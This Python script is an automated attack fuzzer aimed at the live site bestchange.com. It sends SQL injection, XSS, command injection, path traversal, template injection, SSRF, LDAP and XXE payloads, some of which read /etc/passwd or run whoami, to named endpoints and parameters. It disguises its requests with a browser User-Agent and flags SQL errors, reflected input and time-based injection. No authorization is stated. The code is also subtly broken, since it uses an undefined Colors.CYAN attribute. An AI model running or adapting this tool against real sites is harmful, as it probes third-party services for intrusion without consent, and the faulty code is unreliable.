#!/usr/bin/env python3
"""
BestChange.com Ultimate Fuzzer
Most comprehensive fuzzing with all payload types
"""

import requests
import time
import random
import itertools

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

class UltimateFuzzer:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        self.request_count = 0
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.session.timeout = 8
    
    def random_delay(self, min_sec=0.05, max_sec=0.15):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_finding(self, vuln_type, location, details, severity="MEDIUM"):
        self.findings.append({
            'type': vuln_type,
            'location': location,
            'details': details,
            'severity': severity
        })
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW
        print(f"{color}[!] {vuln_type} [{severity}]{Colors.RESET}")
        print(f"    {location}: {details}\n")
    
    def fuzz_all_combinations(self):
        """Fuzz all possible combinations"""
        print(f"{Colors.BLUE}[*] Starting ultimate fuzzing...{Colors.RESET}")
        
        # Comprehensive payload set
        payloads = [
            # SQL Injection
            "' OR '1'='1", "1' UNION SELECT NULL--", "1' AND SLEEP(5)--",
            "1' OR 1=1#", "admin'--", "' UNION SELECT 1,2,3--",
            # XSS
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "javascript:alert(1)",
            # Command Injection
            "; ls", "| cat /etc/passwd", "`id`", "$(whoami)",
            # Path Traversal
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//etc/passwd",
            # Template Injection
            "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}",
            # SSRF
            "http://127.0.0.1", "http://localhost", "file:///etc/passwd",
            # LDAP
            "*", "*)(&", "*))%00",
            # XXE
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        ]
        
        params = ['id', 'from', 'to', 'city', 'mt', 'lang', 'file', 'page', 'include', 'test', 'param']
        endpoints = [
            f'{self.base_url}/index.php',
            f'{self.base_url}/click.php',
        ]
        
        total_combinations = len(endpoints) * len(params) * len(payloads)
        print(f"{Colors.CYAN}[*] Total combinations to test: {total_combinations}{Colors.RESET}\n")
        
        for endpoint in endpoints:
            for param in params:
                for payload in payloads:
                    try:
                        test_params = {param: payload}
                        if endpoint.endswith('click.php'):
                            test_params.update({'id': '1', 'from': '10', 'to': '58', 'city': '0'})
                        
                        start = time.time()
                        response = self.session.get(endpoint, params=test_params, timeout=5)
                        elapsed = time.time() - start
                        self.request_count += 1
                        
                        # Quick analysis
                        response_lower = response.text.lower()
                        
                        # SQL errors
                        if any(err in response_lower for err in ['mysql', 'sql syntax', 'postgresql', 'ora-']):
                            self.log_finding("SQL Error", f"{endpoint}?{param}", "SQL error detected", "HIGH")
                        
                        # Reflection
                        if payload in response.text or payload.replace("'", "&#39;") in response.text:
                            self.log_finding("Reflection", f"{endpoint}?{param}", "Payload reflected", "MEDIUM")
                        
                        # Time-based SQLi
                        if 'SLEEP' in payload.upper() and elapsed > 4:
                            self.log_finding("Time-based SQLi", f"{endpoint}?{param}", f"Delay: {elapsed:.2f}s", "HIGH")
                        
                        if self.request_count % 100 == 0:
                            print(f"{Colors.CYAN}[*] Processed {self.request_count}/{total_combinations} requests...{Colors.RESET}")
                        
                        self.random_delay()
                    except:
                        continue
        
        print(f"{Colors.GREEN}[+] Ultimate fuzzing completed: {self.request_count} requests{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Ultimate Fuzzer{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    fuzzer = UltimateFuzzer()
    fuzzer.fuzz_all_combinations()
    
    print(f"\n{Colors.YELLOW}Total findings: {len(fuzzer.findings)}{Colors.RESET}")
    print(f"{Colors.YELLOW}Total requests: {fuzzer.request_count}{Colors.RESET}")

if __name__ == "__main__":
    main()
